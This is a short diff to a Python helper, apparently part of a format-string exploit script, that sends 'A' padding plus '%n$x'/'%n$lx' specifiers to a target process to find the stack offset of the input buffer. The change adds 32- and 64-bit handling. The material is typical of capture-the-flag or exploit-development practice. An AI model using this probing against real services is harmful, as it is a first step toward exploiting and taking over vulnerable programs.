@@ -6,15 +6,19 @@ def info(s):
 def findPos(r,mul):
     found = False
     n = 0
+    if mul == 8:
+        formatStr = ' %{}$lx'
+    else:
+        formatStr = ' %{}$x'
     while not found:
         n += 1
-        payload = 'A'*mul + ' %{}$lx'.format(n)
+        payload = 'A'*mul + formatStr.format(n)
         r.sendline(payload)
         data = r.recvline()
         if '41'*mul in data:
             found=True
             print (data)
-            info('Position found at %{}$lx'.format(n))
+            info('Position found at'+formatStr.format(n))
 
     return n
 
